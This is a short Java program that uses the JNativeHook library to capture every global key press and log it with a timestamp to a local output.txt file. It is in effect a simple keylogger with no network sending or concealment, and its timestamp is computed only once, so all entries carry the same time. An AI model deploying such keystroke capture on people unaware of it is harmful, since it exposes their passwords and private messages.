package lichmore.desktop;
import java.io.FileNotFoundException;
import java.io.PrintStream;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener,Runnable {
	private static final String FORMAT = "yyyy年MM月dd日 HH時mm分ss秒 ";
	PrintStream out;
	Date date;
	SimpleDateFormat sdf;
	Main(){
		sdf = new SimpleDateFormat(FORMAT);
		date = new Date();
		
		try {
			out = new PrintStream("./output.txt");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new Main());
		
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		out.println(sdf.format(date) +": " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		out.flush();
		//System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

		/*if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            		try {
                		GlobalScreen.unregisterNativeHook();
            		} catch (NativeHookException nativeHookException) {
                		nativeHookException.printStackTrace();
            		}
        	}*/
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		//System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		//out.println(date.toString() +": " + e.getKeyChar() + " release ::R " + e.getRawCode() + " code: " + e.getKeyCode());
	}
	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		//System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
		//out.println(date.toString() +": " + e.getKeyChar() + " type ::R " + e.getRawCode() + " code: " + e.getKeyCode());
	}
	@Override
	public void run() {
		while(true) {
			
		}
		
	}
}